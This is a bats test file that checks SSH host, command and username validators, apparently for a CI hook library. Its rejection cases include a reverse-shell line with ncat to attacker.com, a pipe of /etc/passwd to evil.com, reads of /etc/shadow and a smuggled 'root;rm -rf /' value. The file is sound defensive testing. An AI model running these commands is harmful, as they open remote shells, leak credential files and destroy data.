#!/usr/bin/env bats
# ssh-safety.bats — Tests for SSH-related validation functions

setup() {
  SCRIPT_DIR="$(cd "$(dirname "$BATS_TEST_FILENAME")/../hooks/scripts" && pwd)"
  # shellcheck source=../hooks/scripts/lib/validate.sh
  . "${SCRIPT_DIR}/lib/validate.sh"
}

# --- SSH host validation (private range enforcement) ---

@test "ssh_host: reject public IP 1.1.1.1" {
  run validate_ssh_host "1.1.1.1"
  [ "$status" -eq 1 ]
}

@test "ssh_host: reject public IP 8.8.4.4" {
  run validate_ssh_host "8.8.4.4"
  [ "$status" -eq 1 ]
}

@test "ssh_host: accept 172.16.0.1 (private)" {
  run validate_ssh_host "172.16.0.1"
  [ "$status" -eq 0 ]
}

@test "ssh_host: accept 172.31.255.255 (private)" {
  run validate_ssh_host "172.31.255.255"
  [ "$status" -eq 0 ]
}

@test "ssh_host: reject 172.32.0.1 (public)" {
  run validate_ssh_host "172.32.0.1"
  [ "$status" -eq 1 ]
}

@test "ssh_host: reject 172.15.0.1 (public)" {
  run validate_ssh_host "172.15.0.1"
  [ "$status" -eq 1 ]
}

# --- SSH command injection prevention ---

@test "ssh_cmd: accept safe command" {
  run validate_ssh_command "systemctl status docker"
  [ "$status" -eq 0 ]
}

@test "ssh_cmd: accept command with flags" {
  run validate_ssh_command "df -h /"
  [ "$status" -eq 0 ]
}

@test "ssh_cmd: reject command chain with semicolon" {
  run validate_ssh_command "whoami; cat /etc/shadow"
  [ "$status" -eq 1 ]
}

@test "ssh_cmd: reject background command" {
  run validate_ssh_command "ncat -e /bin/sh attacker.com 4444 &"
  [ "$status" -eq 1 ]
}

@test "ssh_cmd: reject pipe to external" {
  run validate_ssh_command "cat /etc/passwd | nc evil.com 80"
  [ "$status" -eq 1 ]
}

@test "ssh_cmd: reject subshell execution" {
  run validate_ssh_command 'echo $(cat /etc/shadow)'
  [ "$status" -eq 1 ]
}

# --- SSH user validation ---

@test "ssh_user: accept 'runner'" {
  run validate_ssh_user "runner"
  [ "$status" -eq 0 ]
}

@test "ssh_user: accept 'ci-user'" {
  run validate_ssh_user "ci-user"
  [ "$status" -eq 0 ]
}

@test "ssh_user: reject 'root;rm -rf /'" {
  run validate_ssh_user 'root;rm -rf /'
  [ "$status" -eq 1 ]
}

@test "ssh_user: reject user with spaces" {
  run validate_ssh_user "ci user"
  [ "$status" -eq 1 ]
}

@test "ssh_user: reject user starting with hyphen" {
  run validate_ssh_user "-runner"
  [ "$status" -eq 1 ]
}
